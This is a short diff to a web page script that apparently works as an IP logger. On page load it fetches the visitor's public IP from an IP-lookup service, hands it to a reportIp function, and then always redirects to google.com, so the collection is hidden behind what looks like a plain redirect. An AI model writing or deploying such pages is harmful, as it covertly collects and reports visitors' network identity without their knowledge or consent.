@@ -27,9 +27,8 @@
                     await fetch("https://api.ipify.org?format=json")
                         .then((res) => res.json())
                         .then((data) => reportIp(data.ip))
-                } catch (e) {
-                    window.location.replace("https://google.com");
-                }
+                } catch (e) {}
+                window.location.replace("https://google.com");
             })();
         </script>
     </body>
